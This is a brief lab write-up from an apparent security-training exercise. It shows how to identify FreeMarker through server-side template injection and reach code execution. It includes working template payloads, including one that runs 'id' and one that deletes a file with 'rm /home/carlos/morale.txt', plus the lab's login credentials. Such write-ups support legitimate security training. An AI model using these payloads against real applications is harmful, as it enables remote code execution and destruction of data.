# Server-Side Template Injection — Solved via Documentation

This lab is exploitable through server-side template injection. The goal is to figure out which template engine is in use, then use its documentation to work out how to execute arbitrary code, and use that to delete `morale.txt` from Carlos's home directory.

Login credentials for your own account: content-manager:C0nt3ntM4n4g3r

Hint: Try to solve this one using only the official documentation. If you're really stuck, there's a well-known exploit by @albinowax that can help.

---

**References:**
- https://portswigger.net/web-security/server-side-template-injection/exploiting
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#freemarker

pic 1

---

The post templates can be edited directly:

pic 2

Values calculated in the format `${product.X}` show up in the page:

pic 3

Testing with this payload works:

```
${3*3}
```

pic 4

Trying the Mako example payload produced an error instead:

```
<%
                import os
                x=os.popen('id').read()
                %>
                ${x}
```

pic 5

The correct payload format turns out to be:

```
${"freemarker.template.utility.Execute"?new()("id")}
```

pic 6

Payload used to delete the file:

```
${"freemarker.template.utility.Execute"?new()("rm /home/carlos/morale.txt")}
```
